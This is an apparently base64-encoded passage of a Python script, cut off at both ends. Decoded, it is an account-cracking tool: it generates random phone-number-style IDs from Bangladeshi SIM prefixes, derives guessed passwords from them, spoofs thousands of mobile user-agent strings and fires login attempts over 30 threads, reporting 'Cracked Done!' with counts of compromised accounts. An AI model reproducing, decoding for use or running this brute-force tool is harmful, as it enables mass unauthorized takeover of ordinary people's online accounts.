xMjJHJywnMjIwNjEyMlNDJywnMjIwMzEyMUMnLCcyMjA3MTIxMkFHJywnMjIwODEyMTJVRycsJzIxMTIxMjNBRycsJzIyMTExMzNDJywnTWkgOVQgUHJvJ10pCiAgICByYW5kb201PXJhbmRvbS5jaG9pY2UoWyd2aXZvIDEwMDJUJywnVml2byAxNjA1Jywndml2byAxOTE0Jywndml2byAyMDE5Jywndml2byAyMDIzJywndml2byAyMDI3JywnVml2byA2JywnVml2byA5M0sgUHJpbWUnLCdWMjI0MkEnLCdWMjIyN0EnLCd2aXZvIDE5MTgnXSkKICAgIHJhbmRvbTY9cmFuZG9tLmNob2ljZShbJ09QUE8gMTEwNScsJ29wcG8gMTUnLCdvcHBvNjc3OScsJ29wcG82ODMzJywnT1BQTzcyNzMnLCdPcHBvIEExJywnUENITTEwJywnQ1BIMjA3MScsJ0NQSDIxODUnLCdDUEgyMTc5JywnQTM3ZiddKQogICAgcmFuZG9tNz1yYW5kb20uY2hvaWNlKFsnTm9raWEgMScsJ05va2lhIDEgUGx1cycsJ05va2lhIDEwMTEnLCdOb2tpYSBDMDEnLCdOb2tpYSBDMSAybmQgRWRpdGlvbicsJ05va2lhIEMyMCcsJ05va2lhIEMyMCBQbHVzJywnTm9raWEgQzIxJywnTm9raWEgQzIxIFBsdXMnLCdOb2tpYSBDMyddKQogICAgcmFuZG9tOD1yYW5kb20uY2hvaWNlKFsnMjEwNjExMTlERycsJzIxMTIxMTE5VkwnLCcyMjAyMzNMMkcnLCcyMjAzMzNRTCcsJ00yMDA0SjE1U0MnLCdNMjAwNEo3QkMnLCdSZWRtaSAxMSBMaXRlJywnUmVkbWkgMVMnLCdSZWRtaSA5IFBybycsJ1JlZG1pIE5vdGUgOSBQcm8nXSkKICAgIHJhbmRvbTk9cmFuZG9tLmNob2ljZShbJ00yMDA2QzNNSScsJzIyMDMxMTE2QUknLCcyMjAzMzNRUEcnLCdQT0NPIEYyIFBybycsJ00yMDEySzExQUcnLCdNMjEwNEsxMEknLCcyMjAyMTIxMVJHJywnMjExMjEyMTBHJywnTTIwMDRKMTlQSScsJ1BPQ08gTTIgUHJvJ10pCiAgICByYW5kb20xMD1yYW5kb20uY2hvaWNlKFsnV09XNjQnXSkKICAgIF8xPWYnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIHthfTsge3JhbmRvbTF9IEJ1aWxkL3tifS57Y30uMHtkfTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS97ZX0uMC57Zn0ue2d9IE1vYmlsZSBTYWZhcmkvNTM3LjM2JwogICAgXzI9ZidNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQge2F9OyB7cmFuZG9tMn0gQnVpbGQve2J9LntjfS4we2R9OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lL3tlfS4wLntmfS57Z30gTW9iaWxlIFNhZmFyaS81MzcuMzYnCiAgICBfMz1mJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCB7YX07IHtyYW5kb20zfSBCdWlsZC97Yn0ue2N9LjB7ZH07IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUve2V9LjAue2Z9LntnfSBNb2JpbGUgU2FmYXJpLzUzNy4zNicKICAgIF80PWYnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIHthfTsge3JhbmRvbTR9IEJ1aWxkL3tifS57Y30uMHtkfTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS97ZX0uMC57Zn0ue2d9IE1vYmlsZSBTYWZhcmkvNTM3LjM2JwogICAgXzU9ZidNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQge2F9OyB7cmFuZG9tNX0gQnVpbGQve2J9LntjfS4we2R9OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lL3tlfS4wLntmfS57Z30gTW9iaWxlIFNhZmFyaS81MzcuMzYnCiAgICBfNj1mJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCB7YX07IHtyYW5kb202fSBCdWlsZC97Yn0ue2N9LjB7ZH07IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUve2V9LjAue2Z9LntnfSBNb2JpbGUgU2FmYXJpLzUzNy4zNicKICAgIF83PWYnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIHthfTsge3JhbmRvbTd9IEJ1aWxkL3tifS57Y30uMHtkfTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS97ZX0uMC57Zn0ue2d9IE1vYmlsZSBTYWZhcmkvNTM3LjM2JwogICAgXzg9ZidNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQge2F9OyB7cmFuZG9tOH0gQnVpbGQve2J9LntjfS4we2R9OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lL3tlfS4wLntmfS57Z30gTW9iaWxlIFNhZmFyaS81MzcuMzYnCiAgICBfOT1mJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCB7YX07IHtyYW5kb205fSBCdWlsZC97Yn0ue2N9LjB7ZH07IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUve2V9LjAue2Z9LntnfSBNb2JpbGUgU2FmYXJpLzUzNy4zNicKICAgIF8xMD1mJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIHthfTsge3JhbmRvbTEwfSBCdWlsZC97Yn0ue2N9LjB7ZH07IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUve2V9LjAue2Z9LntnfSBNb2JpbGUgU2FmYXJpLzUzNy4zNicKICAgIHVha3UyID0gcmFuZG9tLmNob2ljZShbXzEsXzIsXzMsXzQsXzUsXzYsXzcsXzgsXzksXzEwXSkKICAgIHVnZW4uYXBwZW5kKHVha3UyKQpmb3IgeGQgaW4gcmFuZ2UoMTAwMDApOgogICAgICAgIGFhPSdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQnCiAgICAgICAgYj1yYW5kb20uY2hvaWNlKFsnNicsJzcnLCc4JywnOScsJzEwJywnMTEnLCcxMicsJzEzJ10pCiAgICAgICAgYz1mJyBUTC10bDsge3N0cihndCl9JwogICAgICAgIGc9J0FwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8nCiAgICAgICAgaD1yYW5kb20ucmFuZHJhbmdlKDczLDEwMCkKICAgICAgICBpPScwJwogICAgICAgIGo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApCiAgICAgICAgaz1yYW5kb20ucmFuZHJhbmdlKDQwLDE1MCkKICAgICAgICBsPSdNb2JpbGUgU2FmYXJpLzUzNy4zNicKICAgICAgICB1YWt1Mj1mJ3thYX0ge2J9OyB7Y30pIHtnfXtofS57aX0ue2p9LntrfSB7bH0nCiAgICAgICAgdWdlbi5hcHBlbmQodWFrdTIpCmZvciBhYXQgaW4gcmFuZ2UoMTAwMCk6CiAgICBhPSdSZWRtaScKICAgIGI9cmFuZG9tLnJhbmRyYW5nZSgxLDkpCiAgICBjPSctMCcKICAgIGQ9cmFuZG9tLnJhbmRyYW5nZSgxLDkpCiAgICBlPScvJwogICAgZj1yYW5kb20ucmFuZHJhbmdlKDEsOSkKICAgIGc9Jy4wICgnCiAgICBoPXJhbmRvbS5yYW5kcmFuZ2UoMSwxMikKICAgIGk9J1Byb2ZpbGUvTUlEUC0yLjEgQ29uZmlndXJhdGlvbi9DTERDLTEuMScKICAgIGo9J1VOVFJVU1RFRC8nCiAgICBrPXJhbmRvbS5yYW5kcmFuZ2UoMSwzKQogICAgbD0nLjAnCiAgICB1YWt1Mj1mJ3thfXtifXtjfXtkfXtlfXtmfXtnfXtofXtpfXtqfXtrfXtsfScKICAgIHVnZW4uYXBwZW5kKHVha3UyKQpmb3Igc2F0IGluIHJhbmdlKDEwMDApOgogICAgYT0nTm9raWFYJwogICAgYj1yYW5kb20ucmFuZHJhbmdlKDEsOSkKICAgIGM9Jy0wJwogICAgZD1yYW5kb20ucmFuZHJhbmdlKDEsOSkKICAgIGU9Jy8nCiAgICBmPXJhbmRvbS5yYW5kcmFuZ2UoMSw5KQogICAgZz0nLjAgKCcKICAgIGg9cmFuZG9tLnJhbmRyYW5nZSgxLDEyKQogICAgaT0nUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xJwogICAgaj0nVU5UUlVTVEVELycKICAgIGs9cmFuZG9tLnJhbmRyYW5nZSgxLDMpCiAgICBsPScuMCcKICAgIHVha2F1Mj1mJ3thfXtifXtjfXtkfXtlfXtmfXtnfXtofXtpfXtqfXtrfXtsfScKICAgIHVnZW4uYXBwZW5kKHVha2F1MikKZm9yIGhkaGQgaW4gcmFuZ2UoNTAwMCk6CiAgICAgICBhPSdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQnCiAgICAgICBiPXJhbmRvbS5jaG9pY2UoWyc5JywnMTAnLCcxMScsJzEyJywnMTMnLCcxNCcsJzE1JyxdKQogICAgICAgYz0nUmVkbWkgTm90ZSA5IFBybyBCdWlsZC9TS1ExLjIxMTAxOS4wMDEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8nCiAgICAgICBkPSByYW5kb20ucmFuZHJhbmdlKDQwLDExNSkKICAgICAgIGU9JzAnCiAgICAgICBmPXJhbmRvbS5yYW5kcmFuZ2UoMzAwMCw2MDAwKQogICAgICAgZz1yYW5kb20ucmFuZHJhbmdlKDIwLDEwMCkKICAgICAgIGg9J01vYmlsZSBTYWZhcmkvNTM3LjM2JwogICAgICAgdWc9KGYie2F9IHtifSA7IHtjfXtkfS57ZX0ue2Z9LntnfSB7aH0iKQogICAgICAgdWdlbi5hcHBlbmQodWcpCm9zLnN5c3RlbSgnY2xlYXInKQpqc24gPWlucHV0KCdcMDMzWzE7MzFtW1wwMzNbMTszN20rXDAzM1sxOzMxbV1cMDMzWzE7MzdtWU9VUiBOQU1FIDpcMDMzWzE7MzJtICcpIAojb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL2dpdGh1Yi5jb20vQUxJVkUtMjEyJykKZGVmIGNsZWFyKCk6Cglvcy5zeXN0ZW0oJ2NsZWFyJykKZGVmIGxpbmV4KCk6CglwcmludCgiXDAzM1sxOzM3beKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCIpCmRlZiBiYW5uZXIoKToKICAgIGNsZWFyKCkKICAgIHByaW50KGYiIiIKXDAzM1sxOzM3beKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVlwpcMDMzWzE7Mzdt4pWRXDAzM1sxOzMxbVtcMDMzWzE7MzdtK1wwMzNbMTszMW1dXDAzM1sxOzM3bURldm9sb3BlcjogXDAzM1sxOzM3bfCdkIzwnZCRLvCdkIHwnZCO8J2QkvCdkJIgQUxBTUdJUiBIT1NFTiAgICAgICAgICAgICAgICAgICDilZEgICAgICAgIApcMDMzWzE7Mzdt4pWRXDAzM1sxOzMxbVtcMDMzWzE7MzdtK1wwMzNbMTszMW1dXDAzM1sxOzM3bUdpdGh1Yi4gIDogXDAzM1sxOzM3bfCdkIzwnZCRLvCdkIHwnZCO8J2QkvCdkJIgQUxBTUdJUiBIT1NFTiAgICAgICAgICAgICAgICDilZEgICAgICAgIApcMDMzWzE7Mzdt4pWRXDAzM1sxOzMxbVtcMDMzWzE7MzdtK1wwMzNbMTszMW1dXDAzM1sxOzM3bVRvb2xzICAgIDogXDAzM1sxOzM3bVJhbmRvbStGSUxFICAgICAgICAgICAgICAgICAgICAgICAgIOKVkSAgICAgICAgClwwMzNbMTszN23ilZFcMDMzWzE7MzFtW1wwMzNbMTszN20rXDAzM1sxOzMxbV1cMDMzWzE7MzdtQ3JlYXRlICAgOlwwMzNbMTszN20gMTkgLSAwMyAtIDIwMjQgICAgICAgICAgICAgICAgIOKVkSAgICAgClwwMzNbMTszN23ilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0iIiIpCmRlZiBtYWluKCk6CgliYW5uZXIoKQoJcHJpbnQoIiIiXDAzM1sxOzM3beKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVlyIiIikKCXByaW50KCIiIlwwMzNbMTszN23ilZFcMDMzWzE7MzFtW1wwMzNbMTszN20xXDAzM1sxOzMxbV1cMDMzWzE7MzdtUkFORE9NIENMT05FICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRICAgIiIiKSAgICAgCglwcmludCgiIiJcMDMzWzE7Mzdt4pWRXDAzM1sxOzMxbVtcMDMzWzE7MzdtMlwwMzNbMTszMW1dXDAzM1sxOzM3bUZJTEUgQ0xPTkUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkSIiIikgICAgICAgIAoJcHJpbnQoIiIiXDAzM1sxOzM3beKVkVwwMzNbMTszMW1bXDAzM1sxOzM3bTNcMDMzWzE7MzFtXVwwMzNbMTszN21HTUFJTCBDTE9ORSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZEgICAgICIiIikgICAKCXByaW50KCIiIlwwMzNbMTszN23ilZFcMDMzWzE7MzFtW1wwMzNbMTszN200XDAzM1sxOzMxbV1cMDMzWzE7MzdtRVhJVCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRIiIiKSAgICAgCglwcmludCgiIiJcMDMzWzE7Mzdt4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIiIiKQoJb3B0ID0gaW5wdXQoIlNlbGVjdCA6ICIpCglsb2FkKCJMb2FkaW5nLi4uLiAiKQoJaWYgb3B0ID09ICcxJzoKCQlyYWRvbSgpCgllbGlmIG9wdCA9PSAnMic6CgkJZmlsZSgpCgllbGlmIG9wdCA9PSAnMyc6CgkJZ21haWwoKQoJZWxpZiBvcHQgPT0gJzQnOgoJCXN5cy5leGl0KCJNSVNTIFlPVSIpCmRlZiByYWRvbSgpOgoJYmFubmVyKCkKCXByaW50KCIiIlwwMzNbMTszN23ilZTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZciIiIpCglwcmludCgiIiJcMDMzWzE7Mzdt4pWRXDAzM1sxOzMxbVtcMDMzWzE7MzdtMVwwMzNbMTszMW1dXDAzM1sxOzM3bVJBTkRPTSBDTE9ORSBbTTFdICAgICAgICAgICAgICAgICAgICAgICAgIOKVkSAgICIiIikgICAgIAoJcHJpbnQoIiIiXDAzM1sxOzM3beKVkVwwMzNbMTszMW1bXDAzM1sxOzM3bTJcMDMzWzE7MzFtXVwwMzNbMTszN21SQU5ET00gQ0xPTkUgW00yXSAgICAgICAgICAgICAgICAgICAgICAgICDilZEgICAiIiIpCglwcmludCgiIiJcMDMzWzE7Mzdt4pWRXDAzM1sxOzMxbVtcMDMzWzE7MzdtM1wwMzNbMTszMW1dXDAzM1sxOzM3bVJBTkRPTSBDTE9ORSBbTTNdICAgICAgICAgICAgICAgICAgICAgICAgIOKVkSAgICIiIikgIAoJcHJpbnQoIiIiXDAzM1sxOzM3beKVkVwwMzNbMTszMW1bXDAzM1sxOzM3bTBcMDMzWzE7MzFtXVwwMzNbMTszN21FWElUICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZEiIiIpICAgICAKCXByaW50KCIiIlwwMzNbMTszN23ilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0iIiIpCglvcHQgPSBpbnB1dCgiU2VsZWN0IDogIikKCWxvYWQoIkxvYWRpbmcuLi4uICIpCglpZiBvcHQgPT0gJzEnOgoJCXJhZG9tMSgpCgllbGlmIG9wdCA9PSAnMic6CgkJcmFkb20yKCkKCWVsaWYgb3B0ID09ICczJzoKCQlyYWRvbTMoKQoJZWxpZiBvcHQgPT0gJzAnOgoJCWV4aXQoKQpnZXRfdWFfbGlzdCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1BlYWt5LVhEL1gtU0VSVkVSL21haW4vZGF2LnR4dCIpLnRleHQuc3BsaXRsaW5lcygpCmxvb3A9MApva3MgPSBbXQpjcHMgPSBbXQp1c2VyPVtdCmNweD1bXQpkZWYgcmFkb20yKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIGJhbm5lcigpCiAgICBwcmludCgnXDAzM1sxOzMxbVtcMDMzWzE7MzdtK1wwMzNbMTszMW1dXDAzM1sxOzM3bVNJTSA6ICAwMTcgMDE4IDAxOSAwMTYnKQogICAgbGluZXgoKQogICAgY29kZSA9IGlucHV0KCJcMDMzWzE7MzFtW1wwMzNbMTszN20rXDAzM1sxOzMxbV1cMDMzWzE7MzdtRU5URVIgQ09ERSA6ICIpCiAgICBsb2FkKCJMb2FkaW5nLi4uLiAiKQogICAgbGluZXgoKQogICAgYmFubmVyKCkKICAgIHByaW50KCdcMDMzWzE7MzFtW1wwMzNbMTszN20rXDAzM1sxOzMxbV1cMDMzWzE7MzdtTElNSVQgOiAyMDAwIDUwMDAgMTAwMDAgOTk5OTknKQogICAgbGluZXgoKQogICAgbGltaXQgPSBpbnQoaW5wdXQoIlwwMzNbMTszMW1bXDAzM1sxOzM3bStcMDMzWzE7MzFtXVwwMzNbMTszN21FTlRFUiBMSU1JVCA6ICIpKQogICAgbG9hZCgiTG9hZGluZy4uLi4gIikKICAgIHByaW50KCIiKQogICAgbGluZXgoKQogICAgcHJpbnQoJ1wwMzNbMTszMW1bXDAzM1sxOzM3bStcMDMzWzE7MzFtXVwwMzNbMTszN21ETyBZT1UgV0FOVCBUTyBTSE9XIENQIChZL04pICcpCiAgICBsaW5leCgpCiAgICBjcGMgPSBpbnB1dCgnXDAzM1sxOzMxbVtcMDMzWzE7MzdtK1wwMzNbMTszMW1dXDAzM1sxOzM3bUlOUFVUIDogJykKICAgIGlmIGNwYyBpbiBbJ3knLCdZJ106CiAgICAgICAgY3B4LmFwcGVuZCgneScpCiAgICBlbHNlOgogICAgICAgIGNweC5hcHBlbmQoJ24nKQogICAgZm9yIHggaW4gcmFuZ2UobGltaXQpOgogICAgICAgIG5tcD0nJy5qb2luKHJhbmRvbS5jaG9pY2Uoc3RyaW5nLmRpZ2l0cykgZm9yIF8gaW4gcmFuZ2UoOCkpCiAgICAgICAgdXNlci5hcHBlbmQobm1wKQogICAgd2l0aCBydW4obWF4X3dvcmtlcnM9MzApIGFzIG1laGVkaToKICAgICAgICBiYW5uZXIoKQogICAgICAgIHRvdGFsID0gc3RyKGxlbih1c2VyKSkKICAgICAgICBwcmludCgnXDAzM1sxOzMxbVtcMDMzWzE7MzdtK1wwMzNbMTszMW1dXDAzM1sxOzM3bVVTRVIgTkFNRSBcMDMzWzE7MzJtIDogJytqc24pCiAgICAgICAgcHJpbnQoZidcMDMzWzE7MzFtW1wwMzNbMTszN20rXDAzM1sxOzMxbV1cMDMzWzE7MzdtVE9UQUwgQUNDT1VOVCA6ICcgKyB0b3RhbCkKICAgICAgICBwcmludChmJ1wwMzNbMTszMW1bXDAzM1sxOzM3bStcMDMzWzE7MzFtXVwwMzNbMTszN21UT1RBTCBBQ0NPVU5UIDogJyArIGNvZGUpCiAgICAgICAgcHJpbnQoZidcMDMzWzE7MzFtW1wwMzNbMTszN20rXDAzM1sxOzMxbV1cMDMzWzE7MzdtSUYgTk8gUkVTVUxUIFVTRSBBSVJQTEFORSBNT0RFJykKICAgICAgICBsaW5leCgpCiAgICAgICAgZm9yIGN1ZGkgaW4gdXNlcjoKICAgICAgICAgICAgdWlkPWNvZGUrY3VkaQogICAgICAgICAgICBweiA9IGN1ZGlbMjpdCiAgICAgICAgICAgIGxjID0gY3VkaVs6Nl0KICAgICAgICAgICAgbnggPSBjdWRpWzE6XQogICAgICAgICAgICB2YyA9IHVpZFs6Nl0KICAgICAgICAgICAga2sgPSB1aWRbOjddCiAgICAgICAgICAgIHBzcz1bdWlkLGN1ZGkscHosdmMsbGMsbngsa2tdCiAgICAgICAgICAgIG1laGVkaS5zdWJtaXQobWV0Mix1aWQscHNzLHRvdGFsKQogICAgcHJpbnQoJycpCiAgICBsaW5leCgpCiAgICBwcmludCgiXDAzM1sxOzM3bVtcMDMzWzE7MzJtPVwwMzNbMTszN21dIFwwMzNbMTszMm1DcmFja2VkIERvbmUhIikKICAgIHByaW50KCdcMDMzWzE7MzdtW1wwMzNbMTszMm09XDAzM1sxOzM3bV0gXDAzM1sxOzMybVRvdGFsIE9rL0NwOiAnK3N0cihsZW4ob2tzKSkrJy8nK3N0cihsZW4oY3BzKSkpCiAgICBsaW5leCgpCmRlZiByYWRvbTMoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgYmFubmVyKCkKICAgIHByaW50KCdcMDMzWzE7MzFtW1wwMzNbMTszN20rXDAzM1sxOzMxbV1cMDMzWzE7MzdtU0lNIDogIDAxNyAwMTggMDE5IDAxNicpCiAgICBsaW5leCgpCiAgICBjb2RlID0gaW5wdXQoIlwwMzNbMTszMW1bXDAzM1sxOzM3bStcMDMzWzE7MzFtXVwwMzNbMTszN21FTlRFUiBDT0RFIDogIikKICAgIGxvYWQoIkxvYWRpbmcuLi4uICIpCiAgICBsaW5leCgpCiAgICBiYW5uZXIoKQogICAgcHJpbnQoJ1wwMzNbMTszMW1bXDAzM1sxOzM3bStcMDMzWzE7MzFtXVwwMzNbMTszN21MSU1JVCA6IDIwMDAgNTAwMCAxMDAwMCA5OTk5OScpCiAgICBsaW5leCgpCiAgICBsaW1pdCA9IGludChpbnB1dCgiXDAzM1sxOzMxbVtcMDMzWzE7MzdtK1wwMzNbMTszMW1dXDAzM1sxOzM3bUVOVEVSIExJTUlUIDogIikpCiAgICBsb2FkKCJMb2FkaW5nLi4uLiIpCiAgICBwcmludCgiIikKICAgIGxpbmV4KCkKICAgIHByaW50KCdcMDMzWzE7MzFtW1wwMzNbMTszN20rXDAzM1sxOzMxbV1cMDMzWzE7MzdtRE8gWU9VIFdBTlQgVE8gU0hPVyBDUCAoWS9OKSAnKQogICAgbGluZXgoKQogICAgY3BjID0gaW5wdXQoJ1wwMzNbMTszMW1bXDAzM1sxOzM3bStcMDMzWzE7MzFtXVwwMzNbMTszN21cMDMzWzE7OTNtSU5QVVQgOiAnKQogICAgaWYgY3BjIGluIFsneScsJ1knXToKICAgICAgICBjcHguYXBwZW5kKCd5JykKICAgIGVsc2U6CiAgICAgICAgY3B4LmFwcGVuZCgnbicpCiAgICBmb3IgeCBpbiByYW5nZShsaW1pdCk6CiAgICAgICAgbm1wPScnLmpvaW4ocmFuZG9tLmNob2ljZShzdHJpbmcuZGlnaXRzKSBmb3IgXyBpbiByYW5nZSg4KSkKICAgICAgICB1c2VyLmFwcGVuZChubXApCiAgICB3aXRoIHJ1bihtYXhfd29ya2Vycz0zMCkgYXMgbWVoZWRpOgogICAgICAgIGJhbm5lcigpCiAgICAgICAgdG90YWwgPSBzdHIobGVuKHVzZXIpKQogICAgICAgIHByaW50KCdcMDMzWzE7MzFtW1wwMzNbMTszN20rXDAzM1sxOzMxbV1cMDMzWzE7MzdtVVNFUiBOQU1FIFwwMzNbMTszMm0gOiAnK2pzbikKICAgICAgICBwcmludChmJ1wwMzNbMTszMW1bXDAzM1sxOzM3bStcMDMzWzE7MzFtXVwwMzNbMTszN21UT1RBTCBBQ0NPVU5UIDogJyArIHRvdGFsKQogICAgICAgIHByaW50KGYnXDAzM1sxOzMxbVtcMDMzWzE7MzdtK1wwMzNbMTszMW1dXDAzM1sxOzM3bVRPVEFMIEFDQ09VTlQgOiAnICsgY29kZSkKICAgICAgICBwcmludChmJ1wwMzNbMTszMW1bXDAzM1sxOzM3bStcMDMzWzE7MzFtXVwwMzNbMTszN21JRiBOTyBSRVNVTFQgVVNFIEFJUlBMQU5FIE1PREUnKQogICAgICAgIGxpbmV4KCkKICAgICAgICBmb3IgY3VkaSBpbiB1c2VyOgogICAgICAgICAgICB1aWQ9Y29kZStjdWRpCiAgICAgICAgICAgIHB6ID0gY3VkaVsyOl0KICAgICAgICAgICAgbGMgPSBjdWRpWzo2XQogICAgICAgICAgICBueCA9IGN1ZGlbMTpdCiAgICAgICAgICAgIHZjID0gdWlkWzo2XQogICAgICAgICAgICBrayA9IHVpZFs6N10KICAgICAgICAgICAgcHNzPVt1aWQsY3VkaSxweix2YyxsYyxueCxra10KICAgICAgICAgICAgbWVoZWRpLnN1Ym1pdChtZXQzLHVpZCxwc3MsdG90YWwpCiAgICBwcmludCgnJykKICAgIGxpbmV4KCkKICAgIHByaW50KCJcMDMzWzE7MzdtW1wwMzNbMTszMm09XDAzM1sxOzM3bV0gXDAzM1sxOzMybUNyYWNrZWQgRG9uZSEiKQogICAgcHJpbnQoJ1wwMzNbMTszN21bXDAzM1sxOzMybT1cMDMzWzE7MzdtXSBcMDMzWzE7MzJtVG90YWwgT2svQ3A6ICcrc3RyKGxlbihva3MpKSsnLycrc3RyKGxlbihjcHMpKSkKICAgIGxpbmV4KCkKZGVmIHJhZG9tMSgpOgogICAgdXNlcj1bXQogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBiYW5uZXIoKQogICAgcHJpbnQoJ1wwMzNbMTszMW1bXDAzM1sxOzM3bStcMDMzWzE7MzFtXVwwMzNbMTszN21TSU0gOiAgMDE3IDAxOCAwMTkgMDE2JykKICAgIGxpbmV4KCkKICAgIGNvZGUgPSBpbnB1dCgiXDAzM1sxOzMxbVtcMDMzWzE7MzdtK1wwMzNbMTszMW1dXDAzM1sxOzM3bUVOVEVSIENPREUgOiAiKQogICAgbG9hZCgiTG9hZGluZy4uLi4gIikKICAgIGxpbmV4KCkKICAgIGJhbm5lcigpCiAgICBwcmludCgnXDAzM1sxOzMxbVtcMDMzWzE7MzdtK1wwMzNbMTszMW1dXDAzM1sxOzM3bUxJTUlUIDogMjAwMCA1MDAwIDEwMDAwIDk5OTk5JykKICAgIGxpbmV4KCkKICAgIGxpbWl0ID0gaW50KGlucHV0KCJcMDMzWzE7MzFtW1wwMzNbMTszN20rXDAzM1sxOzMxbV1cMDMzWzE7MzdtRU5URVIgTElNSVQgOiAiKSkKICAgIGxvYWQoIkxvYWRpbmcuLi4uICIpCiAgICBsaW5leCgpCiAgICBmb3Igbm1iciBpbiByYW5nZShsaW1pdCk6CiAgICAgICAgbm1wID0gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDgpKQogICAgICAgIHVzZXIuYXBwZW5kKG5tcCkKICAgIHdpdGggcnVuKG1heF93b3JrZXJzPTMwKSBhcyBhcmlmaW46CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgYmFubmVyKCkKICAgICAgICB0bCA9IHN0cihsZW4odXNlcikpCiAgICAgICAgcHJpbnQoJ1wwMzNbMTszMW1bXDAzM1sxOzM3bStcMDMzWzE7MzFtXVwwMzNbMT